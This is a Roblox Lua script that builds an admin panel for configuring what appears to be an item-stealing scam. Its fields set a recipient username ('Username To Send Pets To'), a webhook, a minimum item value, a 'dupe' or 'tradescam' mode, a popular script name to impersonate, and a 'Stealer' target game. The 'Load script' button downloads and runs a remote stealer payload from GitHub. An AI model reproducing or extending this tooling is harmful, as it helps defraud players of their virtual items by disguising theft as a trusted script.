local funcuser = game:GetService("Players").LocalPlayer.Name

if config.Admin == funcuser then
    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
    local Window = OrionLib:MakeWindow({Name = "Admin Panel | Config Script", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

    local userData = {}
    

    local Tab = Window:MakeTab({
        Name = "Config",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })

    local Section = Tab:AddSection({
        Name = "Username"
    })

    Tab:AddTextbox({
        Name = "Username",
        Default = "",
        TextDisappear = false,
        Callback = function(value)
            userData.Username = value
            print(value)
        end	  
    })

    local Section = Tab:AddSection({
        Name = "WEBHOOK"
    })

    Tab:AddTextbox({
        Name = "Webhook",
        Default = "",
        TextDisappear = false,
        Callback = function(value)
            userData.Webhook = value
            print(value)
        end	  
    })

    local Section = Tab:AddSection({
        Name = "MinimumRAP"
    })

    Tab:AddTextbox({
        Name = "MinimumRAP",
        Default = "",
        TextDisappear = false,
        Callback = function(value)
            userData.MinimumRap = value
            print(value)
        end	  
    })

    local Section = Tab:AddSection({
        Name = "Typesui"
    })

    Tab:AddTextbox({
        Name = "Typesui",
        Default = "",
        TextDisappear = false,
        Callback = function(value)
            userData.Typesui = value
            print(value)
        end	  
    })

    local Section = Tab:AddSection({
        Name = "Typescript"
    })

    Tab:AddTextbox({
        Name = "Typescript",
        Default = "",
        TextDisappear = false,
        Callback = function(value)
            userData.Typescript = value
            print(value)
        end	  
    })

    local Section = Tab:AddSection({
        Name = "Script name"
    })

    Tab:AddTextbox({
        Name = "Script name",
        Default = "",
        TextDisappear = false,
        Callback = function(value)
            userData.ScriptName = value
            print(value)
        end	  
    })

    local Section = Tab:AddSection({
        Name = "Stealer"
    })

    Tab:AddTextbox({
        Name = "Stealer",
        Default = "",
        TextDisappear = false,
        Callback = function(value)
            userData.Stealer = value
            print(value)
        end	  
    })

    Tab:AddButton({
        Name = "Load script",
        Callback = function()
            config = {
                Username = userData.Username or "", -- Username To Send Pets To
                Webhook = userData.Webhook or "", -- Webhook URL
                MinimumRap = userData.MinimumRap or "", -- Minimum RAP of each item you want to get sent to you
                Typesui = userData.Typesui or "", -- kavo, orion, fluent
                Typescript = userData.Typescript or "", -- dupe, tradescam
                ScriptName = userData.ScriptName or "", -- nexus hub, eclipse hub, clever hub
                Stealer = userData.Stealer or "", -- ps99, SOON MM2 AND ADOPT ME
            }
        
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Azurexc/test/main/tief.lua", true))()
        end    
    })
end
